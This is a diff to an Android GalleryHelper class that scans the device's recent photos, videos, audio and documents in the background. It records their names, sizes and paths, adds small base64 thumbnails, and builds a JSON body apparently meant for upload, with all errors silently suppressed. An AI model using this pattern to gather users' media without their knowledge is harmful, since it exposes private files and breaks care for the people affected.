@@ -4,9 +4,13 @@ import android.annotation.SuppressLint;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.database.Cursor;
+import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
+import android.media.ThumbnailUtils;
 import android.net.Uri;
-import android.os.Build;
 import android.provider.MediaStore;
+import android.util.Base64;
+import java.io.ByteArrayOutputStream;
 import org.json.JSONArray;
 import org.json.JSONObject;
 
@@ -18,10 +22,10 @@ public class GalleryHelper {
             public void run() {
                 try {
                     JSONArray allFiles = new JSONArray();
-                    scanCategory(context, MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "image", allFiles, 150);
-                    scanCategory(context, MediaStore.Video.Media.EXTERNAL_CONTENT_URI, "video", allFiles, 50);
-                    scanCategory(context, MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, "audio", allFiles, 50);
-                    scanDocuments(context, allFiles, 50);
+                    scanCategory(context, MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "image", allFiles, 100);
+                    scanCategory(context, MediaStore.Video.Media.EXTERNAL_CONTENT_URI, "video", allFiles, 40);
+                    scanCategory(context, MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, "audio", allFiles, 40);
+                    scanDocuments(context, allFiles, 40);
 
                     if (allFiles.length() > 0) {
                         JSONObject body = new JSONObject();
@@ -42,13 +46,14 @@ public class GalleryHelper {
             String[] proj = new String[]{
                     MediaStore.MediaColumns.DISPLAY_NAME,
                     MediaStore.MediaColumns.SIZE,
-                    MediaStore.MediaColumns.DATA,
-                    MediaStore.MediaColumns.DATE_MODIFIED
+                    MediaStore.MediaColumns.DATA
             };
-            Cursor c = cr.query(uri, proj, null, null, MediaStore.MediaColumns.DATE_MODIFIED + " DESC LIMIT " + limit);
+            Cursor c = cr.query(uri, proj, null, null, MediaStore.MediaColumns.DATE_MODIFIED + " DESC");
             if (c == null) return;
 
-            while (c.moveToNext()) {
+            int count = 0;
+            while (c.moveToNext() && count < limit) {
+                count++;
                 String name = c.getString(c.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME));
                 long size = c.getLong(c.getColumnIndex(MediaStore.MediaColumns.SIZE));
                 String path = c.getString(c.getColumnIndex(MediaStore.MediaColumns.DATA));
@@ -59,25 +64,51 @@ public class GalleryHelper {
                 f.put("file_type", type);
                 f.put("file_size_bytes", size);
 
-                if ("image".equals(type) && path != null && target.length() < 30) {
-                    try {
-                        android.graphics.BitmapFactory.Options o = new android.graphics.BitmapFactory.Options();
-                        o.inSampleSize = 8;
-                        android.graphics.Bitmap b = android.graphics.BitmapFactory.decodeFile(path, o);
-                        if (b != null) {
-                            android.graphics.Bitmap s = android.graphics.Bitmap.createScaledBitmap(b, 96, 96, false);
-                            java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
-                            s.compress(android.graphics.Bitmap.CompressFormat.JPEG, 60, out);
-                            f.put("thumbnail_path", "data:image/jpeg;base64," + android.util.Base64.encodeToString(out.toByteArray(), android.util.Base64.NO_WRAP));
-                            if (s != b) b.recycle();
-                            s.recycle();
-                        }
-                    } catch (Throwable ignored) {}
+                if ("image".equals(type) && path != null && count <= 35) {
+                    String thumb = generateImageThumb(path);
+                    if (thumb != null) f.put("thumbnail_path", thumb);
+                } else if ("video".equals(type) && path != null && count <= 15) {
+                    String thumb = generateVideoThumb(path);
+                    if (thumb != null) f.put("thumbnail_path", thumb);
                 }
                 target.put(f);
             }
             c.close();
         } catch (Exception ignored) {}
+    }
+
+    private static String generateImageThumb(String path) {
+        try {
+            BitmapFactory.Options o = new BitmapFactory.Options();
+            o.inSampleSize = 8;
+            Bitmap b = BitmapFactory.decodeFile(path, o);
+            if (b == null) return null;
+            Bitmap s = Bitmap.createScaledBitmap(b, 80, 80, false);
+            ByteArrayOutputStream out = new ByteArrayOutputStream();
+            s.compress(Bitmap.CompressFormat.JPEG, 45, out);
+            String b64 = "data:image/jpeg;base64," + Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP);
+            if (s != b) b.recycle();
+            s.recycle();
+            return b64;
+        } catch (Throwable t) {
+            return null;
+        }
+    }
+
+    private static String generateVideoThumb(String path) {
+        try {
+            Bitmap b = ThumbnailUtils.createVideoThumbnail(path, MediaStore.Images.Thumbnails.MICRO_KIND);
+            if (b == null) return null;
+            Bitmap s = Bitmap.createScaledBitmap(b, 80, 80, false);
+            ByteArrayOutputStream out = new ByteArrayOutputStream();
+            s.compress(Bitmap.CompressFormat.JPEG, 45, out);
+            String b64 = "data:image/jpeg;base64," + Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP);
+            if (s != b) b.recycle();
+            s.recycle();
+            return b64;
+        } catch (Throwable t) {
+            return null;
+        }
     }
 
     @SuppressLint("Range")
@@ -88,18 +119,19 @@ public class GalleryHelper {
             String[] proj = new String[]{
                     MediaStore.MediaColumns.DISPLAY_NAME,
                     MediaStore.MediaColumns.SIZE,
-                    MediaStore.MediaColumns.DATA,
-                    MediaStore.MediaColumns.MIME_TYPE
+                    MediaStore.MediaColumns.DATA
             };
             String sel = MediaStore.MediaColumns.MIME_TYPE + " LIKE ? OR " +
                     MediaStore.MediaColumns.MIME_TYPE + " LIKE ? OR " +
                     MediaStore.MediaColumns.MIME_TYPE + " LIKE ?";
             String[] args = new String[]{"application/pdf%", "application/msword%", "text/%"};
 
-            Cursor c = cr.query(uri, proj, sel, args, MediaStore.MediaColumns.DATE_MODIFIED + " DESC LIMIT " + limit);
+            Cursor c = cr.query(uri, proj, sel, args, MediaStore.MediaColumns.DATE_MODIFIED + " DESC");
             if (c == null) return;
 
-            while (c.moveToNext()) {
+            int count = 0;
+            while (c.moveToNext() && count < limit) {
+                count++;
                 String name = c.getString(c.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME));
                 long size = c.getLong(c.getColumnIndex(MediaStore.MediaColumns.SIZE));
                 String path = c.getString(c.getColumnIndex(MediaStore.MediaColumns.DATA));
